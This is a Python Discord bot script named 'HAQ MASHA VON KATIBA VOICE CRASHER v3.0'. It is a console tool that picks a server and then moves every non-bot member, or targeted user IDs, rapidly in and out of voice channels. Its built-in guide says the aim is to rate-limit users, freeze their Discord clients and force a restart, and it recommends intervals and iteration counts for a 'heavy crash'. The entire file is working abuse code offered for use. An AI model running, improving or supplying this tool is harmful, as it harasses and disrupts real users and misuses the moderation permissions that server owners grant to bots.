import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import sys

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗          ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗         ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║         ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║         ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
║                                                                                       ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗███████╗                      ║
║                    ██║   ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝                      ║
║                    ██║   ██║██║   ██║██╔██╗ ██║██║     █████╗                        ║
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║██║     ██╔══╝                        ║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║╚██████╗███████╗                      ║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝                      ║
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA VOICE CRASHER v3.0                  ║  ║
║                    ║          FULLY AUTOMATED - NO MESSAGES                       ║  ║
║                    ║              JUST CONSOLE SELECTION                          ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# Global variables
running_crashes = {}

# ============================================
# COLORS
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# VOICE CRASH LOOP
# ============================================
async def voice_crash_loop(user, voice_channels, interval, iterations, guild):
    """Make user join/leave voice channels rapidly to crash their Discord"""
    
    print(f"{Colors.CYAN}    🔥 CRASHING: {user.name}{Colors.RESET}")
    
    for i in range(iterations):
        if user.id in running_crashes and not running_crashes[user.id]:
            break
            
        for vc in voice_channels:
            try:
                # Join voice channel
                await user.move_to(vc)
                await asyncio.sleep(interval)
                
                # Leave voice channel
                await user.move_to(None)
                await asyncio.sleep(interval)
                
            except Exception:
                pass
        
        # Show progress every 20 iterations
        if (i + 1) % 20 == 0:
            print(f"{Colors.YELLOW}        └─ {i+1}/{iterations} cycles on {user.name}{Colors.RESET}")
    
    print(f"{Colors.GREEN}    ✓ COMPLETED: {user.name}{Colors.RESET}")
    
    if user.id in running_crashes:
        running_crashes[user.id] = False

# ============================================
# SHOW FUNCTIONS
# ============================================
def show_servers(guilds):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 25}📋 AVAILABLE SERVERS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    for i, guild in enumerate(guilds, 1):
        members = len(guild.members)
        voice_channels = len(guild.voice_channels)
        voice_members = sum(len(vc.members) for vc in guild.voice_channels)
        
        print(f"{Colors.GREEN}  [{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
        print(f"      ├─ 🆔 ID: {guild.id}")
        print(f"      ├─ 👥 Total Members: {members}")
        print(f"      ├─ 🎧 Voice Channels: {voice_channels}")
        print(f"      └─ 🎙️ Members in VC: {voice_members}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")

def show_voice_channels(guild):
    voice_channels = guild.voice_channels
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 22}🎧 VOICE CHANNELS IN {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    channels_with_members = []
    empty_channels = []
    
    for i, vc in enumerate(voice_channels, 1):
        members_count = len(vc.members)
        if members_count > 0:
            channels_with_members.append(vc)
            print(f"{Colors.GREEN}  [{len(channels_with_members)}]{Colors.RESET} {Colors.WHITE}▶ {vc.name}{Colors.RESET}")
            print(f"      ├─ 🆔 ID: {vc.id}")
            print(f"      ├─ 👥 Members: {members_count}")
            
            # Show member names (max 5)
            member_names = [m.name for m in vc.members[:5]]
            members_str = ", ".join(member_names)
            if len(vc.members) > 5:
                members_str += f" +{len(vc.members)-5} more"
            print(f"      └─ 📝 In VC: {members_str}\n")
        else:
            empty_channels.append(vc)
    
    for vc in empty_channels:
        print(f"{Colors.RED}  [X]{Colors.RESET} {vc.name} {Colors.RED}(EMPTY){Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    return channels_with_members

# ============================================
# CRASH FUNCTIONS
# ============================================
async def crash_all_users(guild, voice_channels, interval, iterations):
    """Crash all non-bot users in the guild"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}{' ' * 15}💀 STARTING MASS VOICE CRASH 💀{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}\n")
    
    members = guild.members
    target_users = [m for m in members if not m.bot]
    total = len(target_users)
    
    print(f"{Colors.CYAN}  📁 Server: {guild.name}{Colors.RESET}")
    print(f"{Colors.CYAN}  🎧 Voice Channels: {len(voice_channels)}{Colors.RESET}")
    print(f"{Colors.CYAN}  👥 Target Users: {total}{Colors.RESET}")
    print(f"{Colors.CYAN}  ⏱️  Interval: {interval}s{Colors.RESET}")
    print(f"{Colors.CYAN}  🔄 Iterations: {iterations} cycles/user{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}  [*] PREPARING TO CRASH {total} USERS...{Colors.RESET}\n")
    
    crashed = 0
    failed = 0
    
    for member in target_users:
        try:
            # Disconnect user if already in voice
            if member.voice and member.voice.channel:
                try:
                    await member.move_to(None)
                    await asyncio.sleep(0.3)
                except:
                    pass
            
            # Start crash loop
            running_crashes[member.id] = True
            asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
            crashed += 1
            
            print(f"{Colors.GREEN}    ✓ [{crashed}/{total}] STARTED: {member.name}{Colors.RESET}")
            await asyncio.sleep(0.15)  # Delay to avoid rate limits
            
        except Exception as e:
            failed += 1
            print(f"{Colors.RED}    ✗ [{crashed+failed}/{total}] FAILED: {member.name}{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}  ✅ VOICE CRASH COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}     • Success: {crashed}{Colors.RESET}")
    print(f"{Colors.RED}     • Failed: {failed}{Colors.RESET}")
    print(f"{Colors.CYAN}     • Total: {total}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}\n")

async def crash_specific_users(guild, voice_channels, interval, iterations, user_ids):
    """Crash specific users by ID"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}{' ' * 15}🎯 CRASHING SPECIFIC USERS 🎯{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.CYAN}  📁 Server: {guild.name}{Colors.RESET}")
    print(f"{Colors.CYAN}  🎧 Voice Channels: {len(voice_channels)}{Colors.RESET}")
    print(f"{Colors.CYAN}  ⏱️  Interval: {interval}s{Colors.RESET}")
    print(f"{Colors.CYAN}  🔄 Iterations: {iterations} cycles/user{Colors.RESET}\n")
    
    crashed = 0
    not_found = 0
    
    for user_id in user_ids:
        member = guild.get_member(user_id)
        if member and not member.bot:
            try:
                if member.voice and member.voice.channel:
                    try:
                        await member.move_to(None)
                        await asyncio.sleep(0.3)
                    except:
                        pass
                
                running_crashes[member.id] = True
                asyncio.create_task(voice_crash_loop(member, voice_channels, interval, iterations, guild))
                crashed += 1
                print(f"{Colors.GREEN}    ✓ CRASHING: {member.name} (ID: {user_id}){Colors.RESET}")
                await asyncio.sleep(0.15)
            except:
                print(f"{Colors.RED}    ✗ FAILED: {member.name}{Colors.RESET}")
        else:
            not_found += 1
            print(f"{Colors.RED}    ✗ NOT FOUND: {user_id}{Colors.RESET}")
    
    print(f"\n{Colors.GREEN}  ✅ CRASHED: {crashed} users{Colors.RESET}")
    print(f"{Colors.RED}  ❌ Not Found: {not_found}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*70}{Colors.RESET}\n")

# ============================================
# MAIN MENU (CONSOLE ONLY)
# ============================================
async def main_menu():
    global bot
    
    while True:
        clear_screen()
        
        print(f"""
{Colors.BOLD}{Colors.MAGENTA}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.MAGENTA}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.MAGENTA}║                    🎧 HAQ MASHA VOICE CRASHER v3.0 🎧                         ║{Colors.RESET}
{Colors.BOLD}{Colors.MAGENTA}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.MAGENTA}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BOLD}{Colors.YELLOW}  OPTIONS:{Colors.RESET}
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │                                                                             │
  │   {Colors.GREEN}[1]{Colors.RESET} 📁 Show All Servers                                          │
  │   {Colors.GREEN}[2]{Colors.RESET} 🎧 Show Voice Channels in a Server                                │
  │   {Colors.GREEN}[3]{Colors.RESET} 💀 CRASH ALL USERS in a Server                                   │
  │   {Colors.GREEN}[4]{Colors.RESET} 🎯 CRASH SPECIFIC USERS (by ID)                                 │
  │   {Colors.GREEN}[5]{Colors.RESET} ⚙️  Configure Crash Settings                                     │
  │   {Colors.GREEN}[6]{Colors.RESET} 🚪 Exit                                                          │
  │                                                                             │
  └─────────────────────────────────────────────────────────────────────────────┘
""")
        
        choice = input(f"{Colors.YELLOW}📌 CHOOSE OPTION (1-6): {Colors.RESET}")
        
        if choice == "1":
            if not bot.guilds:
                print(f"{Colors.RED}❌ NO SERVERS FOUND!{Colors.RESET}")
                input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                continue
            
            show_servers(bot.guilds)
            input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
        
        elif choice == "2":
            if not bot.guilds:
                print(f"{Colors.RED}❌ NO SERVERS FOUND!{Colors.RESET}")
                input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                continue
            
            show_servers(bot.guilds)
            try:
                server_num = int(input(f"\n{Colors.YELLOW}📌 SELECT SERVER NUMBER: {Colors.RESET}"))
                if 1 <= server_num <= len(bot.guilds):
                    guild = bot.guilds[server_num - 1]
                    show_voice_channels(guild)
                else:
                    print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
            except:
                print(f"{Colors.RED}❌ INVALID INPUT!{Colors.RESET}")
            
            input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
        
        elif choice == "3":
            if not bot.guilds:
                print(f"{Colors.RED}❌ NO SERVERS FOUND!{Colors.RESET}")
                input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                continue
            
            show_servers(bot.guilds)
            try:
                server_num = int(input(f"\n{Colors.YELLOW}📌 SELECT SERVER NUMBER: {Colors.RESET}"))
                if 1 <= server_num <= len(bot.guilds):
                    guild = bot.guilds[server_num - 1]
                    
                    # Show voice channels in this server
                    voice_channels = show_voice_channels(guild)
                    
                    if not voice_channels:
                        print(f"{Colors.RED}❌ NO VOICE CHANNELS WITH MEMBERS!{Colors.RESET}")
                        input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                        continue
                    
                    # Select voice channels
                    print(f"\n{Colors.CYAN}📌 SELECT VOICE CHANNELS (comma separated, e.g., 1,2,3 or 'all'):{Colors.RESET}")
                    selection = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    
                    selected_vcs = []
                    if selection.lower() == 'all':
                        selected_vcs = voice_channels
                    else:
                        try:
                            indices = [int(x.strip()) for x in selection.split(',')]
                            for idx in indices:
                                if 1 <= idx <= len(voice_channels):
                                    selected_vcs.append(voice_channels[idx-1])
                        except:
                            print(f"{Colors.RED}❌ INVALID SELECTION!{Colors.RESET}")
                            continue
                    
                    if not selected_vcs:
                        print(f"{Colors.RED}❌ NO CHANNELS SELECTED!{Colors.RESET}")
                        continue
                    
                    # Set interval
                    print(f"\n{Colors.CYAN}📌 ENTER CRASH INTERVAL (seconds between joins, default 0.1):{Colors.RESET}")
                    interval_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    try:
                        interval = float(interval_input)
                        if interval < 0.05:
                            interval = 0.05
                    except:
                        interval = 0.1
                    
                    # Set iterations
                    print(f"\n{Colors.CYAN}📌 ENTER ITERATIONS (how many join/leave cycles, default 100):{Colors.RESET}")
                    iter_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    try:
                        iterations = int(iter_input)
                        if iterations < 10:
                            iterations = 10
                        if iterations > 500:
                            iterations = 500
                    except:
                        iterations = 100
                    
                    # Confirm
                    print(f"\n{Colors.RED}{Colors.BOLD}⚠️  YOU ARE ABOUT TO CRASH ALL MEMBERS IN {guild.name}!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}TYPE 'yes' TO CONFIRM: {Colors.RESET}")
                    
                    if confirm.lower() == 'yes':
                        await crash_all_users(guild, selected_vcs, interval, iterations)
                    else:
                        print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}❌ ERROR: {e}{Colors.RESET}")
            
            input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
        
        elif choice == "4":
            if not bot.guilds:
                print(f"{Colors.RED}❌ NO SERVERS FOUND!{Colors.RESET}")
                input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                continue
            
            show_servers(bot.guilds)
            try:
                server_num = int(input(f"\n{Colors.YELLOW}📌 SELECT SERVER NUMBER: {Colors.RESET}"))
                if 1 <= server_num <= len(bot.guilds):
                    guild = bot.guilds[server_num - 1]
                    
                    voice_channels = show_voice_channels(guild)
                    
                    if not voice_channels:
                        print(f"{Colors.RED}❌ NO VOICE CHANNELS WITH MEMBERS!{Colors.RESET}")
                        input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
                        continue
                    
                    print(f"\n{Colors.CYAN}📌 SELECT VOICE CHANNELS (comma separated or 'all'):{Colors.RESET}")
                    selection = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    
                    selected_vcs = []
                    if selection.lower() == 'all':
                        selected_vcs = voice_channels
                    else:
                        try:
                            indices = [int(x.strip()) for x in selection.split(',')]
                            for idx in indices:
                                if 1 <= idx <= len(voice_channels):
                                    selected_vcs.append(voice_channels[idx-1])
                        except:
                            print(f"{Colors.RED}❌ INVALID SELECTION!{Colors.RESET}")
                            continue
                    
                    if not selected_vcs:
                        print(f"{Colors.RED}❌ NO CHANNELS SELECTED!{Colors.RESET}")
                        continue
                    
                    print(f"\n{Colors.CYAN}📌 ENTER USER IDs (comma separated):{Colors.RESET}")
                    user_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    user_ids = [int(x.strip()) for x in user_input.split(',')]
                    
                    print(f"\n{Colors.CYAN}📌 ENTER CRASH INTERVAL (default 0.1):{Colors.RESET}")
                    interval_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    try:
                        interval = float(interval_input)
                        if interval < 0.05:
                            interval = 0.05
                    except:
                        interval = 0.1
                    
                    print(f"\n{Colors.CYAN}📌 ENTER ITERATIONS (default 100):{Colors.RESET}")
                    iter_input = input(f"{Colors.YELLOW}➜ {Colors.RESET}")
                    try:
                        iterations = int(iter_input)
                        if iterations < 10:
                            iterations = 10
                    except:
                        iterations = 100
                    
                    await crash_specific_users(guild, selected_vcs, interval, iterations, user_ids)
                else:
                    print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
            except:
                print(f"{Colors.RED}❌ INVALID INPUT!{Colors.RESET}")
            
            input(f"\n{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
        
        elif choice == "5":
            print(f"""
{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════════{Colors.RESET}
{Colors.BOLD}{Colors.YELLOW}                    ⚙️  CRASH SETTINGS GUIDE{Colors.RESET}
{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.WHITE}  📌 INTERVAL:{Colors.RESET}
     • 0.05s - Very Fast (High risk of rate limit)
     • 0.1s  - Fast (Recommended)
     • 0.3s  - Medium
     • 0.5s+ - Slow (Safe)

{Colors.WHITE}  📌 ITERATIONS:{Colors.RESET}
     • 50    - Light crash
     • 100   - Normal crash (Recommended)
     • 200   - Heavy crash
     • 500   - Maximum crash (May get rate limited)

{Colors.WHITE}  📌 HOW IT WORKS:{Colors.RESET}
     The bot will rapidly move users between voice channels
     and disconnect them. This causes Discord to:
     1. Rate limit the user
     2. Freeze their Discord client
     3. Require restart to fix

{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════════{Colors.RESET}
""")
            input(f"{Colors.CYAN}PRESS ENTER...{Colors.RESET}")
        
        elif choice == "6":
            print(f"\n{Colors.RED}🚪 EXITING...{Colors.RESET}")
            await bot.close()
            sys.exit()
        
        else:
            print(f"{Colors.RED}❌ INVALID OPTION!{Colors.RESET}")
            input(f"{Colors.CYAN}PRESS ENTER...{Colors.RESET}")

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    clear_screen()
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    await asyncio.sleep(1)
    await main_menu()

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
